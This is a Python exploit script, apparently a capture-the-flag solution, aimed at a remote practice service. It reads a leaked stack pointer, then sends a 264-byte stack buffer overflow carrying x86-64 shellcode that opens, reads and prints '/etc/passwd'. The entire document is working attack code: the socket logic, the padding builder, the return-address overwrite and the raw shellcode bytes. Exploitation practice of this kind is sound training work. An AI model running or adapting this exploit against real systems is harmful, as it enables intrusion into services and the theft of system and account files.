import socket
from struct import pack, unpack


def get_padding(shellcode, buff_size):
    shell_len = len(shellcode)
    padd_len = buff_size - shell_len
    if padd_len < 0:
        raise ValueError('Shellcode too long.')
    return b"\x00" * padd_len


def build_binary(sp):
    buff_size = 264
    shellcode = b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"
    binary = shellcode
    binary += get_padding(shellcode, buff_size)
    binary += sp
    return binary


hostname = 'exploitables.dcdark.net'
port = 43110

print('Attempting to establish socket...')
s = socket.socket()
s.connect((hostname, port))
print('Socket established.')

#exploit code
#print('Send newline to get stack pointer')
#s.send(b'\x0a')
print('Getting stack pointer')
line = s.recv(65535)
print("Stack Pointer: " + str(line))
int_version = int(line, 16)
print("Int of stack pointer: " + str(int_version))
sp = pack('<Q', int_version)
print("verifying hex sp is right: " + hex(unpack('<Q', sp)[0]))
print('LE: ' + str(sp))
exploit = build_binary(sp)
print('exploit: ' + str(exploit))
s.send(exploit)
s.send(b'\x0a')
print('Waiting for response')
print(s.recv(65535))
